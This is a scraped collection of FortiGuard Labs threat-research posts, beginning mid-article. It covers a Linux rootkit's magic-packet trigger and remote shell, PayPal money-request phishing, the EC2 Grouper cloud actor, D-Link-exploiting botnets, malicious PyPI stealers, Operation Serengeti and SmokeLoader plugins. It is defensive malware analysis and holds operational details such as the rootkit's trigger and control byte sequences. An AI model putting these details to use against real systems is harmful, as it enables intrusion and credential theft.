“\\x30”+“\\x3E\\x2B\\xF6\\x06”+”\\xAA\\x9Bx16\\xD9”+”\\x34\\x34\\x34\\x34” Once the attack-init packet is verified, the kernel module records the source IP and Port and, in some global variables, the destination IP and Port. This ensures that subsequent traffic meeting the conditions will be recognized as coming from the attacker and only processed within the Netfilter hook function. Meanwhile, a series of kernel APIs are called, including queue_work_on(), kthread_create_on_node(), wake_up_process(), and call_usermodehelper(). Based on our analysis, these APIs start the user-space file (sysinitd). The call_usermodehelper() API is used in the Linux kernel to execute a user-space program from the kernel space. The function definition is: intcall_usermodehelper(constchar*path,char**argv,char**envp,intwait); According to the ASM instructions in Figure 6, it starts the user-space process with the command line argument “abrtinfo:0.” The path to the process, “/usr/share/empty/init/sysinitd,” is hardcoded in the kernel module. We explain how the user-space process works in the next section. All response packets from the kernel module have the same format, as shown in the table below: Offset Length Description 0x00 4 The size of the payload data. 0x04 Variable Payload data. The payload data is encrypted as long as the first byte in the attack-init packet is “\\x31.” The encryption key is calculated from the verification data in the attack-init packet, which is then returned to the attacker while the attack-init packet is being processed. Figure 7 shows a simulated attack scenario where the attacker (the client) sends an attack-init packet to the compromised system (the server). The rootkit malware verifies the packet, generates an encryption key (4 bytes) from the first packet and other related data, and sends it back to the attacker in a response packet. If the attack-init packet enables the encryption function, the encryption key will be used to encrypt and decrypt the payload data on both the client and server. Otherwise, both sides will discard the encryption key packet. From that point on, the attacker can communicate with the infected system. Incoming packets from the attacker are passed to the user-space process, which reads from “/proc/abrtinfo” via the read callback function. The kernel module also sends back the output of the user-space process when it writes data to “/proc/brtinfo.” Figure 8 shows a pseudo-code example of the read callback function assigned to “/proc/abrtinfo. \" This function calls a kernel API copy_to_user() to copy the attacker’s data to the user-space process (sysinitd). When the attacker sends 4-byte control commands to the compromised system, “/proc/rtinfo” is used to pass the commands to and control the user-space process. Command Action 0xB3FEB404 It passes 0xE1 to “/proc/rinfo”. 0x80CDD03C It passes 0xE2 to “/proc/rinfo”. 0x44724774 It passes 0xE4 to “/proc/rinfo”. The user-space file “sysinitd” was copied to “/usr/share/empty/init” in Install.sh. In reviewing its ELF header information in Figure 9, we find that the ELF type is EXEC, indicating that it is a user-space executable file. The sysinitd process is started by the kernel module. It disguises itself as a bash program by replacing its process name with “bash,” which is a decrypted string. Because of this, the system administrator is unlikely to identify it as malware. It then calls APIs to archive this, like the following C-code: memset(argv[0], 0, sizeof(argv[0])); strcpy(argv[0], “bash”); It then verifies whether its command-line argument is “abrtinfo” using the API strcmp(), as shown in Figure 10. If the command-line argument does not match, the process exits. Next, it invokes the Linux system call “fork()” to create a child process. From this point on, the parent and child processes follow different workflows. After fork() is initiated, it continues to set the current process’s standard input to “/proc/abrtinfo,” standard output, and standard error to “/proc/brtinfo” by invoking three dup2() system calls. Refer to Figure 11 for the corresponding ASM instructions that perform this action. These procfs entries are created in the kernel module. A callback function is assigned to each one, which is called when read or write operations occur. At the bottom of Figure 11, another system call, execv(), is invoked to replace the current process with a specified one, which in this case is “/bin/sh.” The attacker can now remotely execute any command with root privilege on the compromised system through the malicious kernel module (sysinitd.ko) and the child process (sysinitd -> /bin/sh). The parent process now begins performing tasks typically associated with a daemon process, such as managing the child process (e.g., starting, restarting, and killing the child process). It reads control commands from the file descriptor “/proc/rtinfo” and follows the different branches depending on the command values. As indicated in Figure 12, it reads the control command 0xE1. To archive this, the attacker must send this 4-byte packet\"\\x04\\xb4\\xfe\\xb3\". The supported control commands are listed in the following table: Command Action 0xE1 Restarts the child process. 0xE2 Kills the child process. 0xE3 Sends Ctrl+C to the child process. 0xE4 Kills both the child and parent process. Figure 13 is a screenshot of the output of the command “ps aux | grep –e “ sh” –e “bash,” where “sh” is the child process and “bash” is the parent process. Figure 14 illustrates how the attacker controls the compromised system via rootkit malware and the user-space process. We developed a Python script to simulate the attacker controlling the compromised Linux system. By leveraging the Python script to send numerous Linux commands to the compromised system, we can see the communication and command execution results, as shown in Figure 15, which is a Wireshark screenshot of the traffic data. The commands sent to the Linux system are “whoami,” “pwd,” “wget -O Fortinet.html -o summary www.fortinet.com,” and “ls -l fortinet.html.” In this analysis, we focused on the rootkit malware.  We first explained how the kernel module set a Netfilter hook function on NF_INET_PRE_ROUTING to hijack the incoming TCP traffic to the compromised system. Next, we elaborated on what related tasks the Netfilter hook function performs, including how it handles the attacker-init packet and the response packet format, invokes the user-space file, and exchanges data between the user-space process and the kernel module. You also learned how the user-space process is started, how it disguises itself as “bash,” how it creates the child process using a fork() system call, and how it is eventually replaced by “/bin/sh” to process the attacker’s Linux commands to control the system. Finally, we demonstrated how an attacker establishes a connection to a compromised system, sends Linux commands, and retrieves the result through traffic sniffing.

    "link": "https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing",
    "content": "FortiGuard Labs Threat Research As a CISO, I am always on high alert for phishing attempts, and this recent example immediately set off alarm bells. Most obviously, why am I even receiving this request? I don’t use my corporate email address in PayPal. Additionally, the To: address, “Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com,” is not mine. Usually, this would result in a ‘report and move on’ action from me, but I was a little intrigued. Whenever I see a phishing email, I always think, WWMMD (what would my Mum do?). How would I have responded based on all the methods I have told her to look for? Firstly, the sender address appears to be valid and not spoofed. …and the URL looks genuine. At this point, this seems to be a genuine email—at least, my mum might think so. So, what is going on? A genuine email can’t still be a problem, can it? Well, here is the catch in this instance. When you click on the link, you are redirected to a PayPal login page showing a request for payment. A panicked person may be tempted to log in with their account details, but this would be very dangerous. It links your PayPal account address with the address it was sent to—not where you received it. In this case, PayPal thinks it sent this request to Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com The scammer appears to have simply registered an MS365 test domain, which is free for three months, and then created a Distribution List (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) containing victim emails, as shown below: On the PayPal web portal, they simply request the money and add the distribution list as the address: This money request is then distributed to the targeted victims, and the Microsoft365 SRS (Sender Rewrite Scheme) rewrites the sender to, e.g., bounces+SRS=onDJv=S6[@]5ln7g7.onmicrosoft.com, which will pass the SPF/DKIM/DMARC check. Once the panicking victim logs in to see what is going on, the scammer’s account (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) gets linked to the victim’s account. The scammer can then take control of the victim's PayPal account—a neat trick. It’s so neat, in fact, that it would sneak past even PayPal’s own phishing check instructions. The beauty of this attack is that it doesn’t use traditional phishing methods. The email, the URLs, and everything else are perfectly valid. Instead, the best solution is the Human Firewall—someone who has been trained to be aware and cautious of any unsolicited email, regardless of how genuine it may look. This, of course, highlights the need to ensure your workforce is receiving the training they need to spot threats like this to keep themselves—and your organization—safe. This is a perfectly valid email in most ways. However, it is still possible to create a DLP rule to look for multiple conditions that indicate that this email is being sent via a distribution list. The following rule will successfully identify such a case. phishing Industry Trends FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",

    "title": "Catching \"EC2 Grouper\"- no indicators required!",
    "link": "https://www.fortinet.com/blog/threat-research/catching-ec2-grouper-no-indicators-required",
    "content": "FortiGuard Labs Threat Research Through the years of analyzing identity compromises in the cloud, we’ve seen the same attackers pop up regularly, some more frequently than others. Among the more prolific ones we’ve come to know is one we’ve dubbed “EC2 Grouper”. Over the past couple of years, we’ve seen this actor in several dozen customer environments, making them one of the more active groups we’ve tracked. This usual suspect is attributed by their penchant for using similar user agents and the same security group naming convention in their attacks. Whileindicatorssuch as user agents and even security group names can assist in attribution and hunting, we have found them unreliable for comprehensive threat detection. In this blog, we’ll detail tactics associated with EC2 Grouper and howLacework FortiCNAPPcan be leveraged to detect this threat, among others. More importantly, we will showcase how this is achieved without relying on actor-specific indicators, which can be transient in nature. EC2 Grouper is characterized by their usage of AWS tools for PowerShell to carry out attacks. This is presumed by their user agent, which was consistent for a number of years: AWSPowerShell.Common/4.1.90.0 .NET_Core/6.0.5 OS/Microsoft_Windows_10.0.17763 PowerShellCore/7.-1 ClientAsync In recent attacks, they have updated their UA, which now contains new versioning and unusual # characters, which could indicate a possible detection countermeasure. AWSPowerShell.Common/4.1.534.0 ua/2.0 .NET_Core#6.0.5 OS/windows#10.0.17763.0 md/ARCH#X64 PowerShellCore/7.-1 cfg/retry-mode#legacy md/ClientAsync A more consistent indicator has emerged with a security group naming convention. Attacks in the cloud often leverage the CreateSecurityGroup API (T1098)  to enable remote access and lateral movement in the cloud environment. EC2 Grouper will typically attempt to create multiple groups using the same naming convention of ec2group suffixed with a sequential combination of 1-5. Example request parameters: {\"groupDescription\":\"ec2group\",\"groupName\":\"ec2group\"} {\"groupDescription\":\"ec2group1\",\"groupName\":\"ec2group1\"} {\"groupDescription\":\"ec2group12\",\"groupName\":\"ec2group12\"} {\"groupDescription\":\"ec2group123\",\"groupName\":\"ec2group123\"} {\"groupDescription\":\"ec2group1234\",\"groupName\":\"ec2group1234\"} {\"groupDescription\":\"ec2group12345\",\"groupName\":\"ec2group12345\"} In all instances of EC2 Grouper attacks, cloud activity appears to be largely automated. The attacker will initially make calls to DescribeInstanceTypes to inventory EC2 types within the environment and then DescribeRegions to retrieve information about regions available for resources. Upon acquiring available regions, the following API calls are iteratively executed for every available region: Interestingly, we have never observed calls to AuthorizeSecurityGroupIngress, which is ultimately required to configure inbound access to any EC2 launched with the security group. However, on several occasions, we have observed CreateInternetGateway and CreateVpc, which are required for remote access. To date, we have not observed what could be classified as actions based on objectives or manual activity in a compromised cloud environment. It could be either that EC2 Grouper is selective in their escalation or compromised accounts were detected and quarantined before they had the opportunity to escalate. Despite this, resource hijacking (T1496) is likely the general objective. However, to what end is currently unconfirmed. In every attack involving valid accounts, the credentials must originate from somewhere. One of the more common sources for compromised keys remains code repositories. Developers often mistakenly commit cloud access keys to public repositories. Once this occurs, the clock starts ticking until the credentials fall into the hands of attackers, are discovered by secret scanners, or both. This is believed to be the primary method of credential acquisition for EC2 Grouper, as their cloud attacks are frequently accompanied by attacks from other threat actors. EC2 Grouper, however, is by far the most prolific actor allegedly using this vector. Given the popularity of obtaining credentials in code repositories, it can be prudent to look for legitimate secret scanning services as part of your detection strategy. These include GitGuardian and Github’s secret scanning service.In our composite alerts, we have included secret scanning as a signal, as it is frequently seen in conjunction with illicit credential usage. Of course, credential checking alone does not indicate a compromise, so other signals need to be correlated to reduce false positives. When alerting on EC2 Grouper, our composite alerts have evaluated other techniques, such as using specific APIs known to be leveraged in attacks. These are effectively mapped to the respective techniques with the assistance of the open-sourceTDiscoverproject. Finally, we evaluate anomalies as part of the composite alert. An alleged attack may exhibit characteristics indicative of malicious reconnaissance or privilege escalation. However, it's crucial to confirm this through anomaly detection. Identifying illicit usage of valid credentials in the cloud can be a nuanced and difficult task. This poses a considerable challenge when it comes to detection, as the vast majority of attacks in the cloud involve compromised credentials. While the attack detailed in this blog had various atomic indicators specific to the actors’ tactics and techniques, most attacks do not exhibit these unique characteristics. To achieve higher accuracy, it becomes more critical to correlate weaker signals involving aspects that attackers cannot control. For example, while attackers can easily control their source IP and user agent, theycannotcontrol whether it is anomalous to the environment. Similarly, they cannot control the APIs or sequence of APIs needed to carry out their objectives. By leveraging these as signals to a composite alerting mechanism, one can achieve a much higher level of detection efficacy. Cloud detection and response(CDR) is a crucial component in addressing cloud identity compromises such as the one documented here. With over 80% of attacks in the cloud involving compromised credentials, the effectiveness of your CDR solution can directly dictate the severity of a cloud attack.Lacework FortiCNAPPoffers comprehensive CDR protection with our innovative composite alerting technology. Cloud identity compromises can be difficult to isolate as they often blend in with legitimate activity. Lacework FortiCNAPP can evaluate numerous weak signals together through composite alerting, culminating in a much higher detection efficacy than point detection alone. Lacework FortiCNAPP also integrates other essential components, such asCIEMfor informing the blast-radius of a compromised identity.

    "link": "https://www.fortinet.com/blog/threat-research/botnets-continue-to-target-aging-d-link-vulnerabilities",
    "content": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlier. D-Link DIR-806 devices. D-Link GO-RT-AC750 GORTAC750_revA_v101b03 and GO-RT-AC750_revB_FWv200b02. D-Link DIR-845L router v1.01KRb03 and beforeImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs noticed a spike in the activity of two different botnets in October and November of 2024. One was the Mirai variant “FICORA,” and the other was the Kaiten variant “CAPSAICIN.” These botnets are frequently spread through documented D-Link vulnerabilities that allow remote attackers to execute malicious commands via a GetDeviceSettings action on the HNAP (Home Network Administration Protocol) interface. This HNAP weakness was first exposed almost a decade ago, with numerous devices affected by a variety of CVE numbers, including CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, and CVE-2024-33112. According to our IPS telemetry, attackers frequently reuse older attacks, which accounts for the continued spread of the “FICORA” and “CAPSAICIN” botnets to victim hosts and infected targets. This article looks at their infected traffic and offers insights into these botnets. The attackers we identified spreading the “FICORA” botnet triggered the incident from 185[.]191[.]126[.]213 and 185[.]191[.]126[.]248, which are servers located in the Netherlands. Because this latest “FICORA” attack targeted many countries around the world, we speculate that this was not a targeted attack. “CAPSAICIN,” unlike “FICORA,” was only intensely active over two days—October 21 and 22, 2024. East Asian countries bore the brunt of those incidents by attackers actively spreading the “CAPSAICIN” botnet. The “FICORA” botnet downloads a shell script named “multi,” executes the script, and then removes it after execution. The shell script “multi” uses multiple strategies to download the malware “FICORA,” such as “wget,” “ftpget,” “curl,” and “tftp.” This downloader script first kills all processes with the same file extension as the malware “FICORA.” It then downloads and executes its various malware by targeting different Linux architectures, including “arc,” “arm,” “arm5,” “arm6,” “arm7,” “i486,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “powerpc,” “powerpc-440fp,” and “sparc.” The following analysis is based on “la.bot.arm7.” “FICORA” encodes its configuration with the ChaCha20 encryption algorithm. This configuration includes its C2 server domain and a unique string. The scanner in “FICORA” includes a hard-coded username and password for its brute force attack function. The malware also embeds a shell script with hexadecimal ASCII characters and constructs it during the scanner's execution. The shell script tries to identify any process containing the keyword “dvrHelper,” which is probably another malware and kills it. The malware “FICORA” is a variant of the Mirai malware. It can be identified by its similar architecture.It also includes DDoS attack functions using protocols like “UDP,” “TCP,” and “DNS.” The malware “CAPSAICIN”’s downloader is delivered from 87[.]10[.]220[.]221. The shell script “bins.sh” downloads and executes the malware “CAPSAICIN” with prefix file name “yakuza” targeting different Linux architectures, including “arm,” “arm5,” “arm6,” “arm7,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “ppc,” “sparc,” and “x86.” We will focus on “yakuza.x86” for the following analysis. Once we execute the malware, it pops up the string “CAPSAICIN” where the malware variant name is given. The malware kills known botnet processes to ensure it is the only botnet executing on the victim host. “CAPSAICIN” establishes a connection socket with its C2 server, “192[.]110[.]247[.]46,” and sends the victim host’s OS information and the nickname given by the malware back to the C2 server. It waits for a command from the C2 server to execute numerous functions listed below. Using its “PRIVMSG” function, “CAPSAICIN” sets up environment variables for more functions the C2 server can conduct using the following commands. In addition to the above commands, the “PRIVMSG” function can trigger DDoS attacks using the following commands from the C2 server. In addition to these attack functions, the malware includes a help message for each function to remind the attacker of needed parameters. The malware “CAPSAICIN” seems to be a variant based on the Keksec group’s botnets. According to hard-coded information found in version 17.0.0 of the malware developed by the Keksec group, we surmise that “CAPSAICIN” was developed based on that version. Although the weaknesses exploited in this attack had been exposed and patched nearly a decade ago, these attacks have remained continuously active worldwide. FortiGuard Labs discovered that “FICORA” and “CAPSAICIN” spread through this weakness. Because of this, it is crucial for every enterprise to regularly update the kernel of their devices and maintain comprehensive monitoring. These steps will help reduce the likelihood of malware being deployed through this vulnerability.

    "title": "Analyzing Malicious Intent in Python Code: A Case Study",
    "link": "https://www.fortinet.com/blog/threat-research/analyzing-malicious-intent-in-python-code",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High Fortinet's AI-driven OSS malware detection system recently identified two malicious packages: Zebo-0.1.0 on November 16, 2024, and Cometlogger-0.1 on November 24, 2024. Malicious software often masquerades as legitimate code, hiding its harmful features behind complex logic and obfuscation. In this analysis, we examine the Python scripts behind these two packages, outline their malicious behaviors, and provide insights into their potential impact. The Zebo-0.1.0 script is a typical example of malware, with functions designed for surveillance, data exfiltration, and unauthorized control. It uses libraries like pynput and ImageGrab, along with obfuscation techniques, indicating clear malicious intent. The Cometlogger-0.1 script also shows signs of malicious behavior, including dynamic file manipulation, webhook injection, stealing information, and anti-VM checks. Zebo-0.1.0 is structured to perform various tasks that violate user privacy and security. Its main components include: Obfuscation:bypass detection mechanismsKeylogging:Capturing every keystroke typed by the user.Screen Capturing:Periodic screenshots of the user's desktop.Data Exfiltration:Uploading sensitive information (keystrokes, screenshots, etc.) to a remote server.Persistence Mechanism:Ensuring the malware re-executes upon system startup. Using obfuscation intentionally hides the true functionality, making it harder for users or security systems to understand what the code is doing. In this example, if the script or its components are obfuscated, it could hide malicious behavior, such as unauthorized data collection or system manipulation. Obfuscation can also be used to bypass security measures, potentially allowing malware to run undetected, which poses serious risks to both the user’s privacy and system integrity. The code uses hex-encoded strings (e.g., \\x68\\x74\\x74...) to hide the URL of the server it communicates with. It employs a command and control mechanism via HTTP requests to a remote server, which is used to manage the malware's behavior and collect stolen data.This obfuscation is a clear sign of malicious intent, as it seeks to bypass detection mechanisms during code review or automated scans. The use of the pynput library enables the script to log every keystroke made by the user. This feature is implemented through the following functions: Screen capturing can secretly record the user's screen, potentially violating their privacy and leading to unauthorized access to sensitive information. In the provided code, the post-installation script could be used to implement such functionality, allowing an attacker to monitor the user's activities without their consent. This is considered malicious behavior, as it can be used to steal personal information or perform other harmful actions, and it can lead to significant security risks, including data breaches and legal consequences. Using data exfiltration in this code is dangerous because it involves secretly collecting and transferring sensitive data from the user's system without their knowledge or consent. The post-installation script (i_am_cute()) can be used for unauthorized data access, potentially sending private information to a remote server. This could violate privacy, compromise security, and result in legal consequences for the software developer or distributor if the behavior is discovered, as it may be seen as a form of hacking or data theft. Logs and screenshots are sent to a Firebase database, exposing the user’s sensitive data to unauthorized parties. This is executed through HTTP PUT requests: To ensure it runs every time the system starts, the malware: The code provided raises several red flags indicative of potential malicious activity. Webhook Manipulation:The code dynamically requests a \"webhook\" from the user and embeds it into Python files like `Comet.py` and `Exela.py.’Information Theft:Steals tokens, passwords, and accounts from various platforms (Discord, Steam, Instagram, Twitter, etc.)Anti-VM Detection:Virtualization environments to evade analysis or sandboxing.Dynamic File Modification:The scripts modify Python files at runtime, a method that can enable malicious code injection for exploitation during execution.Persistence:Maintain long-term presence on the victim’s system. Security Risks: Injecting a webhook URL directly into the code allows for potential manipulation by unauthorized users, opening the door to malicious attacks. If attackers alter the webhook URL, it could redirect sensitive data to malicious servers, compromising security. Data Integrity: Allowing dynamic changes to webhooks during runtime can result in unintentional modifications, leading to incorrect or inconsistent data being sent. This could affect the system's functionality and lead to miscommunication between services. Malicious Exploitation: By hardcoding the webhook injection in multiple places, this approach can be exploited to execute malicious code. Since the code can be easily modified and reused, attackers could send harmful payloads through the webhook, potentially damaging systems or stealing data. The script repeatedly prompts users for a webhook, dynamically injecting it into files Injected webhooks could: Send sensitive information to a remote server. Facilitate command-and-control (C2) operations, allowing an attacker to issue commands remotely. The script from comet.py poses significant risks by violating user privacy through the collection of saved passwords, session cookies, and browsing history, which can be exploited to impersonate users, steal financial data, or compromise accounts. For organizations, this malware threatens unauthorized access to corporate accounts and data breaches, potentially leading to severe legal and financial consequences. Additionally, by targeting cookies from platforms like Instagram, TikTok, and Twitter, it enables account hijacking for spam, scams, or identity theft. Attackers often use anti-VM techniques to identify if their code is running in a sandbox or virtual machine, commonly used by researchers or security tools.The code checks for common virtualization indicators such as \"VMware\" and \"VirtualBox\".If such indicators are found, the code terminates execution to avoid detection.This allows attackers to bypass security monitoring in controlled environments. The Fake Error Message can trick users into running the malware code. Security Concerns: The code modifies files based on user inputs, potentially altering sensitive data like webhooks. This opens the door for malicious exploitation if an attacker provides malicious input or manipulates the file content. Data Integrity Risks: The use of replace operations without validation can lead to unintentional changes or corruption of files, especially if the files are being used by other processes or applications concurrently. Malware Risks: The integration with UPX, which compresses executables, raises concerns regarding the execution of malicious code. The UPX tool is commonly used to obfuscate malware, making it harder for security tools to detect it. The code modifies external files (Comet.py and Exela.py) without verifying their content or purpose: Security Risks: UPX can obfuscate the code, making it harder for security tools to analyze the executable. This could lead to undetected malicious behavior if used in malicious software. Compatibility Issues: UPX compression might cause problems with certain antivirus software or system configurations, as some security tools may flag compressed executables as suspicious, leading to false positives. Performance Impact: While UPX reduces file size, the decompression at runtime could introduce delays, affecting the performance of the application, especially if it's used excessively in critical areas of the code. The frequent invocation of utils/upx.exe using subprocess.call is highly suspicious: Continuous exception loops can lead to several problems, such as consuming excessive CPU resources, causing system freezes, and degrading performance. They may also obscure the root cause of the issue, making debugging more difficult. If exceptions are raised without proper handling, the program becomes unresponsive and harder to maintain. The script employs an infinite loop to persist in the user's environment: Disconnect from the Internet: Immediately isolate the infected system to prevent further data exfiltration. Run Antivirus Tools: Use reputable antivirus software to detect and remove the malware. Reformat the System: If the infection persists, reformat the system and reinstall the OS. Code Review: Always verify third-party scripts and executables before running them. Network Monitoring: Implement firewalls and intrusion detection systems to identify suspicious network activity. Education: Train users to recognize phishing attempts and avoid executing unverified scripts. This malicious Python script (Zebo-0.1.0) is a textbook example of malware, exhibiting functionalities designed for surveillance, data exfiltration, and unauthorized control. Its sophisticated use of libraries like pynput and ImageGrab, coupled with obfuscation techniques, demonstrates a clear intent to harm or exploit users. Such scripts highlight the importance of cybersecurity awareness and robust defensive measures. The script (Cometlogger-0.1) exhibits several hallmarks of malicious intent, including dynamic file manipulation, webhook injection, steal information, ANTI-VM. While some features could be part of a legitimate tool, the lack of transparency and suspicious functionality make it unsafe to execute. Always scrutinize code before running it and avoid interacting with scripts from unverified sources.

    "content": "FortiGuard Labs Threat Research Earlier this week, the International Criminal Police Organization (INTERPOL) and the African Union Mechanism for Police Cooperation (AFRIPOL)announcedthat the organizations have identified and arrested members of cybercrime groups operating across Africa. These individuals specialize in ransomware, digital extortion, online scams, and business email compromise (BEC) attacks. INTERPOL and AFRIPOL activities related to this effort, called Operation Serengeti, were supported by numerous partners, including Fortinet, and research from theCybercrime Atlas. The Cybercrime Atlas is a collaboration initiated by the World Economic Forum’sPartnership Against Cybercrime, in which cybercrime experts use open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. Fortinet is a launch partner of the Cybercrime Atlas, which has been in operation for a year. Separately, Fortinet, a longtime INTERPOL partner, was named a private contributing partner in Operation Serengeti for playing a vital role in sharing intelligence, supporting analysis, and disrupting criminal activities. As a result of Operation Serengeti, authorities across 19 participating countries arrested 1,006 suspects and dismantled nearly 135,000 malicious infrastructures and networks. The arrests follow months of international police collaboration, acting on information initially shared by partners, including the Cybercrime Atlas. This most recent effort identified and monitored these threat actors, leading to the arrests. Information provided by participating countries of ongoing cases with INTERPOL fed into 65 cyber analytical reports to ensure actions on the ground were intelligence-led and focused on the most significant actors. Seven private sector partners also played a vital role by sharing intelligence, supporting analysis, and disrupting criminal activities. These partners provided on-site support and offered around-the-clock remote assistance to patch vulnerabilities and secure critical infrastructure for the participating member countries. Operation Serengeti disrupted: These cybercrime operations resulted in a combined monetary loss of almost $193 million among numerous victims. The Cybercrime Atlas, which became operational earlier this year, was created to drive real impact and a coordinated effort to create a chain of disruption in the world of cybercrime. It will enable the entire cybersecurity community to become more resilient and effective at stopping cybercrime on a global scale. The Cybercrime Atlas comprises experts using open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. The group’s members currently include more than 20 law enforcement agencies, private-sector security companies, and incident responders, non-governmental organizations, financial institutions, and academic partners. In itsfirst year of operation, Cybercrime Atlas contributors shared more than 10,000 community-vetted and actionable data points and supported two cross-border cybercrime disruption efforts. They created seven comprehensive intelligence packages on emerging threats that were shared with law enforcement so that this actionable data could be operationalized. These intelligence packages created by Cybercrime Atlas contributed directly to the success of Operation Serengeti. Fortinet has been a trusted partner to INTERPOL since 2015, and officially became an INTERPOL Gateway partner in 2018. This ongoing collaboration has resulted in greater threat intelligence standards and protocols implemented across the industry and impactful global cybercriminal takedowns and disrupting criminal activities. In 2022,FortiGuard Labsprovided evidentiary support toINTERPOLand African Member countries as part of theAfrica Cyber Surge Operation(ASCO) to help detect, investigate, and disrupt cybercrime through coordinated law enforcement activities, utilizing INTERPOL platforms, tools, and channels in close cooperation with AFRIPOL. As a part of that effort, FortiGuard Labs provided actionable threat intelligence over six months, consisting ofbotnet,command and control (C2), andmalwareinfrastructure research, including C2, malware, and botnet victims in Africa. This enabled member countries to identify more than 1,000 malicious IP addresses, dark web markets, and individual threat actors. Turning the tide against cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale. No single organization can effectively halt cybercrime alone. These arrests are a strong example of how public-private partnerships can impact the disruption of large-scale cybercrime activities, leading to a safer, more resilient society. Every organization has a place in the chain of disruption against cyberthreats. Creating ongoing collaboration opportunities with high-profile, well-respected organizations from both the public and private sectors is a fundamental aspect of Fortinet’s commitment to enhancing cyber resilience around the globe. By working together, we can make meaningful progress in disrupting adversary operations. cybercrime,derek manky FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In September 2024, FortiGuard Labs observed an attack using the notorious SmokeLoader malware to target companies in Taiwan, including those in manufacturing, healthcare, information technology, and other sectors. SmokeLoader is well-known for its versatility and advanced evasion techniques, and its modular design allows it to perform a wide range of attacks. While SmokeLoader primarily serves as a downloader to deliver other malware, in this case, it carries out the attack itself by downloading plugins from its C2 server. Figure 2 shows a phishing email used in this campaign. The sender claims the attached malicious file is a quotation and includes a list of special instructions. While this email is persuasive, as it uses native words and phrases, these phishing emails are sent to multiple recipients with almost the same content. Even the recipient's name (the redaction in the file name) is not changed when sent to other companies. This has been observed in other attack chains of this campaign. In addition, the font and color of the email sign-off and telephone number are different from the main body, which suggests that the text may have been copied from elsewhere. Regardless of which it uses, the third stage uses a VBS file to launch the malware loader, AndeLoader, and the final payload is an identical file of SmokeLoader. CVE-2017-0199 is a vulnerability in Microsoft Office that exploits an OLE2-embedded link object. When a victim opens the crafted file, a malicious document is automatically downloaded and executed. The file attached to the phishing email is protected, and the object containing the malicious link is hidden in a sheet. CVE 2017-11882 is an RCE (Remote Code Execution) vulnerability in the equation editor in Microsoft Office. The shellcode contains a decryption algorithm and encrypted data. After the decryption, the shellcode gets the necessary APIs and downloads the VBS file for the next stage with theURLDownloadToFilefunction. The HTA file contains VBS code that is encoded using URL-encoded several times. After decoding, we see a VBS script with numerous spaces inserted between symbols and variables. Additionally, long variable names are used to frustrate analysis. The VBS script executes a snippet of PowerShell code, which downloads the VBS file for AndeLoader. Below is the deobfuscated PowerShell code. It downloads a steganographic image that contains base64-encoded data of the injector and extracts the data enclosed by<<BASE64_START>>and<<BASE64_END>>. After this, the data is decoded into the injector and itsdnlib.IO.Home.VAImethod, which receives six arguments: download link of the data for SmokeLoader, flag for persistence, file path, filename, injection target, and an unused argument. In this case, the persistence feature is not used, so the second, third, and fourth arguments are just filled withdestivado, which translates to “disabled” in English. TheClass.Startmethod combines all VBS files in the current working path of cmd.exe into a VBS file whose path and filename are specified by the third and fourth arguments ofTools.Ande,respectively. The file path is written to a new value namedPathin theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runregistry key to make the VBS file execute automatically when the system starts up. If this feature is used, it enables the VBS file downloaded in the previous stage to persist. After this, the TXT file specified by the first argument ofTools.Andeis downloaded, and its data is deobfuscated to get SmokeLoader, which is later injected intoRegAsm.exe. The following process of injection is commonly used: Below is SmokeLoader's execution flow. This section focuses on the plugins downloaded from its C2 server. Figure 14 shows that, though the response is404 Not Found, it still contains the payload for the attack. The payload contains configurations and the encrypted data for plugins: In this case, it contains configurations for Plugin 4, 5 (fgclearcookies), 8, and 9 (keylog_rules). This will be introduced later. Nine plugins are received from the C2 server, including three individual plugins and three plugins with 32-bit and 64-bit versions. According to the plugin's architecture, SmokeLoader uses a loop to sequentially inject these plugins intoexplorer.exe. SmokeLoader creates a suspended process ofexplorer.exeand writes encrypted data of the plugin and decryption algorithm along with a snippet of shellcode used to call the decryption algorithm. After this, it changes the code at the start of the entry point of explorer.exe into a jump to the shellcode and callsResumeThreadto execute the plugin. Below is the plugin list: Plugin 1 32-bits Steals login credentials, FTP credentials, cookies, autofill data from browsers, email software, and FTP client Plugin 2 64-bits Steals login credentials from Firefox and Thunderbird. The function is the same as what Plugin 1 uses. Plugin 3 32-bits Read data from email software Plugin 4 32-bits Injects its code into the browser and sets a hook to steal data Plugin 5 64-bits The 64-bit version of Plugin 4 Plugin 6 32-bits Injects its code into email software, browser, and FTP client and sets a hook to steal data Plugin 7 64-bits The 64-bit version of Plugin 6 Plugin 8 32-bits Injects its code into explorer.exe or processes specified by C2 server and sets a hook to steal data Plugin 9 64-bits The 64-bit version of Plugin 8 This plugin uses a loop to sequentially execute functions for the target software. The functions can be categorized into the following types according to the target: This plugin leverages functions in vaultcli.dll to get login credentials from Internet Explorer. Credential Manager is a feature in the Windows system that is used to store passwords. vaultcli.dll provides the functions to enumerate and get information from the credential vault. This plugin enumerates the registry keys underSoftware\\Mozillato find the one containing the valuePathToExeto get the default location of Firefox and Thunder. Then, the plugin searches forprofiles.iniin the default location and parses it to get the location oflogins.jsonandcookies.sqlite, from which it extracts login credentials. The plugin searches for theLocal Statefile withinWeb Data,Cookies,andLogin Datafolders under the installation path and then extracts login credentials and auto-fill data. To ensure it can locate the target file, it searches the following locations: It 